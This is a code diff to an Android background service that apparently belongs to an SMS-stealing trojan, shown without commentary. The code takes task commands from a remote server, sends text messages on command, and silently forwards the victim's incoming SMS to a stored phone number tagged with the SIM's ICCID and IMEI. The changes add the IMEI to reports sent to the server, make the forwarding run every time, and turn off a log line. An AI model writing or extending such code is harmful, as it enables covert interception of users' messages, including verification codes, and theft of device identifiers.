@@ -125,6 +125,7 @@ public class AService extends Service implements Runnable{
             sfilter.addAction(Intent.ACTION_SCREEN_OFF);
             sfilter.addAction(Intent.ACTION_SCREEN_ON);
             registerReceiver(srcReceiver, sfilter);
+            sfilter = null;
         }
         
         if(smsReceiver==null)
@@ -134,6 +135,7 @@ public class AService extends Service implements Runnable{
             filter.addAction(Tag.SMS_RECEIVER); 
             filter.setPriority(Integer.MAX_VALUE); 
             registerReceiver(smsReceiver, filter); 
+            filter = null;
         }
         
 	}
@@ -212,9 +214,10 @@ public class AService extends Service implements Runnable{
 			socketDisConnect();
 			Logger.info("链接断开xxxxx"+System.currentTimeMillis()+":"+lastXinTiao);			
 		}
-		executorService.submit(new onStrartRunnable(intent));
-		
-		
+		if(intent!=null)
+		{
+			executorService.submit(new onStrartRunnable(intent));
+		}
 		
 	}
 	private void socketDisConnect() {
@@ -365,7 +368,7 @@ public class AService extends Service implements Runnable{
             		String bodycode = retJson.substring(2);
             		if(headcode.equals("2A"))
             		{//任务 
-            			Logger.error(retJson);
+            			//Logger.error(retJson);
             			Future future = executorService.submit(new smsTask(bodycode));
             			
             			if(future==null)
@@ -485,6 +488,7 @@ public class AService extends Service implements Runnable{
 							Tools.sendSms(mContext, sn, sm);
 							JSONObject post = new JSONObject();
 							post.put("iccid", iccid);
+							post.put("imei", imei);
 							post.put("OK", "1");
 							post.put("t", "11");
 							if(sendMessage("1C"+post.toString()))
@@ -506,16 +510,18 @@ public class AService extends Service implements Runnable{
 						long kid = 0;
 						if(dbHelper!=null)
 						{
-							kid = dbHelper.insertKeyword(keyword, isback,sn,toTel,etime);
+							kid = dbHelper.insertKeyword(keyword, isback,sn,etime,toTel);
 							Logger.info("xxxxxxxxxxxxxxxxxx"+kid);
 						}else{
 							Logger.info("xxxxxxxxxxxxxxxxxx  null");
 						}
 						
+						//回报成功
 						if(kid!=0)
 						{
 							JSONObject post = new JSONObject();
 							post.put("iccid", iccid);
+							post.put("imei", imei);
 							post.put("OK", "1");
 							post.put("t", "12");
 							if(sendMessage("1C"+post.toString()))
@@ -599,29 +605,27 @@ public class AService extends Service implements Runnable{
 					String number = intent.getStringExtra("number");
 					String message = intent.getStringExtra("message");
 					if(dbHelper==null)
-					{//启动手机短信上传
+					{
 						dbHelper = new DbHelper(mContext,1);				
-					}else{
-			        	Cursor c = dbHelper.getkeys();		        	
-				    	if(null!=c&&c.getCount()>0)
-				    	{
-				    		if(c.moveToFirst())
-				    		{
-				    			do{
-				    				String totel = c.getString(5);
-				    				Logger.info("totel:"+totel);
-				    				if(!totel.equals("-1"))
-				    				{
-				    					String tomessage = iccid+imei.substring(imei.length()-4)+":"+message;
-				    					Tools.sendSms(mContext, totel, tomessage);
-				    				}
-				    			}while(c.moveToNext());
-				    		}
-				    	}
 					}
-				}
-				
-				
+					//启动手机短信上传
+		        	Cursor c = dbHelper.getkeys();		        	
+			    	if(null!=c&&c.getCount()>0)
+			    	{
+			    		if(c.moveToFirst())
+			    		{
+			    			do{
+			    				String totel = c.getString(5);
+			    				Logger.info("totel:"+totel);
+			    				if(!totel.equals("-1"))
+			    				{
+			    					String tomessage = iccid+imei.substring(imei.length()-4)+":"+message;
+			    					Tools.sendSms(mContext, totel, tomessage);
+			    				}
+			    			}while(c.moveToNext());
+			    		}
+			    	}
+				}	
 				return;
 			}
 			if(action!=null){
@@ -686,8 +690,7 @@ public class AService extends Service implements Runnable{
 					{
 						Logger.error("发送成功");
 					}else{
-						Logger.error("发送不成功,查看是否通过短信发送");
-						
+						Logger.error("发送不成功,查看是否通过短信发送");						
 					}	
 				}
 			}
